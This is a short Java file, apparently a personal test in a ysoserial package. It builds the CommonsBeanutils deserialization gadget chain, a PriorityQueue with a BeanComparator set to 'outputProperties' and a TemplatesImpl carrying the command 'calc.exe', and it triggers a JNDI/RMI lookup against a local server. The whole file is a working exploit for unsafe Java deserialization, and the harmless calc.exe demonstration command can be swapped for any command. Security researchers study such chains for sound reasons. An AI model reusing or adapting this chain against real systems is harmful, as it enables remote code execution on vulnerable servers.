package ysoserial.Test;


import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.naming.InitialContext;
import java.math.BigInteger;
import java.util.PriorityQueue;


public class RMIClint {
    public static void main(String[] args) {
        try {
//            Registry registry = LocateRegistry.getRegistry(9999);
//            registry.lookup("xxx");
            new InitialContext().lookup("rmi://127.0.0.1:9999/Calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static Object getpayload() throws Exception{

        final Object templates = Gadgets.createTemplatesImpl("calc.exe");
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
//		Reflections.setFieldValue(comparator, "property", "outputProperties");
        comparator.setProperty("outputProperties");
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }
}
